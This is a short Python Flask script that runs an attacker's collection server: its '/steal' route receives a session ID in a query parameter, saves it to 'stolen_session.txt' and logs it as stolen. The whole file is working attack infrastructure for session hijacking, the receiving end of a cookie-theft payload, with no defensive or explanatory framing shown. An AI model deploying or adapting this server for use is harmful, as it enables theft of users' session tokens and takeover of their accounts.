from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['GET'])
def steal_session():
    stolen_session = request.args.get('session_id')
    if stolen_session:
        with open('stolen_session.txt', 'w') as file:
            file.write(stolen_session)
        print(f"[+] Stolen session ID saved: {stolen_session}")
        return "Thank you!", 200
    return "No session ID received.", 400

if __name__ == '__main__':
    app.run(port=5001)